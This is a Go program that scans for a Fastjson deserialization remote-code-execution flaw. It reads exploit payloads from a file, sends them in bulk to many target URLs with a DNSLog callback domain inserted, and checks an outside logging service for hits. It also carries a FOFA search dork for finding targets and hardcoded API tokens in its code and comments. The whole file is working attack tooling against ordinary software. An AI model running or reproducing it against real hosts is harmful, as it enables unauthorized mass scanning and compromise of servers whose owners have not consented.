package main

import (
	"bufio"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"github.com/go-resty/resty/v2"
	"github.com/panjf2000/ants/v2"
	"github.com/projectdiscovery/gologger"
	"github.com/projectdiscovery/gologger/levels"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
	"strconv"
)

const (
	// HTTP defines the plain http scheme
	HTTP = "http://"
	// HTTPS defines the secure http scheme
	HTTPS = "https://"
)

var finalresult []string
//var wg2 sync.WaitGroup
 
// VulnInfo contains the Vulnerability information about CVE-2021-41277 
type VulnInfo struct {
Name         string
VulID        string
Version      string
Author       string
VulDate             string 
References  []string 
AppName string 
AppPowerLink string 
AppVersion             string 
VulType  string 
Description string 
Category             string
Dork         QueryDork
}

type QueryDork struct {
	Fofa    string
	Quake   string
	Zoomeye string
	Shodan  string
}

func showInfo() {
	info := VulnInfo{
		Name:         "Fastjson Deserialize RCE", 
		Version:      "1.0",
		Author:       "youqi",
		VulDate:      "2022-5-16",
		AppName: "Fastjson",
		AppVersion:   "1.2.24；1.2.47",
		Description:  "阿里巴巴开源的Java对象和JSON格式字符串的快速转换的工具库",
		Dork:         QueryDork{Fofa: `app="Fastjson"`},
}
	vulnJson, err := json.MarshalIndent(info, "", "  ")
	if err != nil {
		fmt.Println(err)
	}
	fmt.Print(string(vulnJson))

}

// Options contains the configuration options
type Options struct {
	Verbose     bool   // Verbose flag indicates whether to show verbose output or not
	ShowInfo    bool   //ShowInfo is a flag indicates whether to show vuln info output or not
	Stdin       bool   // Stdin specifies whether stdin input was given to the process
	Timeout     int    // Timeout is the seconds to wait for sources to respond
	Target      string // Target to verfity
	TargetsFile string // TargetsFile containing list of targets to verfity
	Threads     int    // Thread controls the number of threads to use for active enumerations
	Output      io.Writer
	OutputFile  string // Output is the file to write found subdomains to.
}

// parseOptions parses the command line flags provided by a user
func parseOptions() *Options {
	options := &Options{}
	flag.BoolVar(&options.Verbose, "v", false, "Show Verbose output")
	flag.BoolVar(&options.ShowInfo, "s", false, "Show VulnInfo output")
	flag.IntVar(&options.Threads, "t", 10, "Number of concurrent goroutines for resolving")
	flag.StringVar(&options.Target, "u", "", "Target to verfity Fastjson Deserialize RCE")
	flag.StringVar(&options.TargetsFile, "f", "", "File containing list of targets to verfity")
	flag.StringVar(&options.OutputFile, "o", "", "File to write output to (optional)")
	flag.Parse()

	// Default output is stdout
	options.Output = os.Stdout

	// Check if stdin pipe was given
	options.Stdin = hasStdin()

	if options.ShowInfo {
		gologger.Info().Msg("VulnInfo:\n")
		showInfo()
		os.Exit(0)
	}

	if options.Verbose {
		gologger.DefaultLogger.SetMaxLevel(levels.LevelVerbose)
	} else {
		gologger.DefaultLogger.SetMaxLevel(levels.LevelSilent)
	}

	// Validate the options passed by the user and if any
	// invalid options have been used, exit.
	err := options.validateOptions()
	if err != nil {
		gologger.Fatal().Msgf("Program exiting: %s\n", err)
	}

	return options
}

func hasStdin() bool {
	stat, err := os.Stdin.Stat()
	if err != nil {
		return false
	}

	isPipedFromChrDev := (stat.Mode() & os.ModeCharDevice) == 0
	isPipedFromFIFO := (stat.Mode() & os.ModeNamedPipe) != 0

	return isPipedFromChrDev || isPipedFromFIFO
}

// validateOptions validates the configuration options passed
func (options *Options) validateOptions() error {
	// Check if target, list of targets, or stdin info was provided.
	// If none was provided, then return.
	if options.Target == "" && options.TargetsFile == "" && !options.Stdin {
		return errors.New("no input list provided")
	}

	if options.Threads == 0 {
		return errors.New("threads cannot be zero")
	}

	return nil
}

func targetParser(target string) []string {
	if !(strings.HasPrefix(target, HTTP) || strings.HasPrefix(target, HTTPS)) {
		res := []string{HTTP + target, HTTPS + target}
		return res
	}
	res := []string{target}
	return res
}

func verify(target interface{}) {
t := target.(string)
file, err := os.Open("poc.txt")
if err != nil {
}
defer file.Close()
scanner := bufio.NewScanner(file)
for scanner.Scan() {
	//wg2.Add(1)
	timeUnix:=strconv.FormatInt(time.Now().Unix(), 10) + ".7a18ab82.dns.1433.eu.org."
	//fmt.Println(timeUnix)
	line := "{'youqi':"+scanner.Text()+"}"
	//fmt.Println(line)
	line2 := strings.ReplaceAll(line,"dnslog", timeUnix)
	//fmt.Println(line2)
	url := t 
	client := resty.New()
	client.SetTimeout(15 * time.Second)
	_, err := client.R().EnableTrace().SetHeader("Content-Type", "application/json").SetBody(line2).Post(url) 
	if err != nil {
		gologger.Warning().Msg("Request error: " + url)
	}else {
		client := resty.New()
		client.SetTimeout(15 * time.Second)
		//"https://log.xn--9tr.com/?domain=dns.1433.eu.org.&token=zifxy6sknglq&key=507a43c8.dns.1433.eu.org."
		//http://api.ceye.io/v1/records?token=019a2710d2d038d74ee7372cbbd6efe3&type=dns&filter=
		//resp, _ := client.R().EnableTrace().SetHeader("User-Agent"," Chrome/83.0.4103.116 Safari/537.36").Get(api)
		resp, _ := client.R().EnableTrace().SetHeader("Content-Type", "application/x-www-form-urlencoded").SetBody("domain=dns.1433.eu.org.&token=slf2emy2unv7").Post("https://log.xn--9tr.com/get_results") 
		bodyString := string(resp.Body())
		//fmt.Println(bodyString)
		if resp.StatusCode() == http.StatusOK { 
			if strings.Contains(bodyString,timeUnix) {
			//gologger.Info().Msg(target + " is vulnerable") 
			finalresult = append(finalresult, t)
			fmt.Println(t+"is vulnerable to Fastjson poc: "+line)
			}else {
				gologger.Warning().Msg("no vulnerable")
			}
		}else {
			gologger.Warning().Msg("no vulnerable")
	}
	}
	//wg2.Done()
}
	//wg2.Wait()
}

func createFile(filename string, appendtoFile bool) (*os.File, error) {
	if filename == "" {
		return nil, errors.New("empty filename")
	}

	dir := filepath.Dir(filename)

	if dir != "" {
		if _, err := os.Stat(dir); os.IsNotExist(err) {
			err := os.MkdirAll(dir, os.ModePerm)
			if err != nil {
				return nil, err
			}
		}
	}

	var file *os.File
	var err error
	if appendtoFile {
		file, err = os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	} else {
		file, err = os.Create(filename)
	}
	if err != nil {
		return nil, err
	}

	return file, nil
}

func writePlainResult(results []string, writer io.Writer) error {
	bufwriter := bufio.NewWriter(writer)
	sb := &strings.Builder{}

	for _, result := range results {
		sb.WriteString(result)
		sb.WriteString("\n")

		_, err := bufwriter.WriteString(sb.String())
		if err != nil {
			bufwriter.Flush()
			return err
		}
		sb.Reset()
	}
	return bufwriter.Flush()
}

func runner(options *Options) error {
	targets := []string{}
	outputs := []io.Writer{options.Output}

	if options.OutputFile != "" {
		file, err := createFile(options.OutputFile, false)
		if err != nil {
			gologger.Error().Msgf("Could not create file %s for %s: %s\n", options.OutputFile, options.Target, err)
			return err
		}
		defer file.Close()

		outputs = append(outputs, file)
	}

	if options.Target != "" {
		// If output file specified, create file
		targets = targetParser(options.Target)
	}

	if options.TargetsFile != "" {
		reader, err := os.Open(options.TargetsFile)
		if err != nil {
			return err
		}
		scanner := bufio.NewScanner(reader)
		for scanner.Scan() {
			target := scanner.Text()
			if target == "" {
				continue
			}
			targets = append(targets, targetParser(target)...)
		}
		reader.Close()
		return err
	}

	if options.Stdin {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			target := scanner.Text()
			if target == "" {
				continue
			}
			targets = append(targets, targetParser(target)...)
		}
	}

	wg := sync.WaitGroup{}

	p, _ := ants.NewPoolWithFunc(options.Threads, func(i interface{}) {
		verify(i)
		wg.Done()
	})
	defer p.Release()
	for _, t := range targets {
		//gologger.Info().Msg(t)
		wg.Add(1)
		_ = p.Invoke(t)
	}
	wg.Wait()

	var err error
	for _, w := range outputs {
		err = writePlainResult(finalresult, w)
		if err != nil {
			gologger.Error().Msgf("Could not verbose results, Error: %s\n", err)
			return err
		}
	}

	return nil
}

func main() {

	// Parse the command line flags
	options := parseOptions()
	//fmt.Print(options)
	err := runner(options)
	if err != nil {
		gologger.Error().Msg("Runner Error")
	}
}
